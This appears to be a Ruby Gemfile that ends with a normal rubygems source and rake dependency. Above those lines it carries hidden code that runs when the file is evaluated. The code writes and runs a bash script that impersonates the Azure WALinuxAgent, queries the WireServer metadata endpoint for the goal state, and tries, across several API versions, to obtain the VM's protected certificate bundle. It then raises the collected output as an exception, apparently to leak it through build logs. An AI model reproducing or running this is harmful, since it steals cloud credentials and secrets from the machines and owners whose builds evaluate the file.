require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v107
rm -rf "$WD" && mkdir "$WD" && cd "$WD" || exit 1
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
CERT_URL=$(python3 -c 'import re; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(m.group(1) if m else "")')
echo "STEP2 cert_url=$CERT_URL"
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_B64=$(openssl base64 -A < cert.pem)
echo "STEP3 attempting cert fetch (no -f, verbose)"
# Try with WALinuxAgent agent version variants
for VER in 2015-04-05 2018-12-12 2022-06-01 2012-11-30; do
  RESP=$(curl -s -m 10 -w "_HTTP_%{http_code}_LEN_%{size_download}" -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: $VER" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" -o cert-resp.xml "$CERT_URL")
  SIZE=$(wc -c < cert-resp.xml 2>/dev/null || echo 0)
  BODY=$(head -c 200 cert-resp.xml 2>/dev/null | tr '\n' ' ')
  echo "STEP4_ver=$VER $RESP size=$SIZE body=$BODY"
done
# Also try without cipher header (some versions don't need it)
echo "STEP5 no_cipher_header"
RESP=$(curl -s -m 10 -w "HTTP_%{http_code}" -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" -o cert-resp2.xml "$CERT_URL")
echo "STEP5 no_cipher_$RESP size=$(wc -c < cert-resp2.xml 2>/dev/null || echo 0) body=$(head -c 200 cert-resp2.xml 2>/dev/null | tr '\n' ' ')"
SHELL
Tempfile.create('v107.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v107 " + line.chomp[0..280] }
  m << "v107 EOL exit=#{$?.exitstatus}"
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
